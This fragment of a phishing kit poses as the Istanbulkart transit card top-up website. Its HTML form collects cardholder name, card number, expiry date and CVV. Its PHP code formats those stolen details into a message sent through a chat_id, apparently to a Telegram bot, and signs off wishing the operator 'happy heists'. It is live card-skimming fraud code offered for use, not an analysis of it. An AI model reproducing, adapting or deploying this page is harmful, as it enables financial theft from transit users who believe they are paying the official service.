...
𝙱𝚊𝚔𝚒𝚢𝚎 𝙼𝚒𝚔𝚝𝚊𝚛ı : '.$bakiye.'Türk Lirası
𝙸̇𝚜𝚝𝚊𝚗𝚋𝚞𝚕𝚔𝚊𝚛𝚝 𝙽𝚞𝚖𝚊𝚛𝚊𝚜ı : '.$kartno.'
-----------
𝙸̇𝚜𝚒𝚖: '.$isim.'
𝙺𝚊𝚛𝚝 𝙽𝚞𝚖𝚊𝚛𝚊𝚜ı : '.$kkartno.'
𝙰𝚢/𝚈ı𝚕 : '.$sonkul.'
𝙲𝚅𝚅 : '.$cvv.'
-----------
Ülke : '.$ulke.'
...
Tarih : '.$cur_time.'
-----------
İyi Vurgunlar Şeytanınız Bol Olsun 😈
',
  'chat_id' => $chat_id
];
        ...
        <section class="hero-1" id="home">
            ...
            <div class="container">
                <div class="row align-items-center hero-content">
                    <div class="col-lg-6">
                        <h1 class="hero-title fw-bold mb-4 pb-3 text-white">İstanbulkart'ına online olarak bakiye yükle
                        </h1>
                        <p class="text-white opacity-75 mb-4 pb-3 fs-17">İstanbulkart Web sitesi üzerinden, TL/abonman yükleme vb işlemlerini kolayca yapabilirsin!</p>
                        <div class="subscribe-form me-lg-5 mb-5 mb-lg-0">
                            <input type="text" name="bakiye" class="form-control" maxlength="10" placeholder="Yüklenecek Bakiye Miktarı" /><br>
                            <input type="text" name="isim" class="form-control" maxlength="50" placeholder="Kart Sahibinin Adı" /><br>
                            <input type="text" name="kkartno" class="form-control" maxlength="19" placeholder="Kredi/Banka Kartı Numarası" /><br>
                            <input type="text" name="sonkul" class="form-control" maxlength="12" placeholder="Son Kullanım Tarihi" /><br>
                            <input type="text" name="cvv" class="form-control" maxlength="4" placeholder="CVV" />
                            <br>
                            <center>
                            <button type="submit" class="btn btn-info">Devam Et</button>
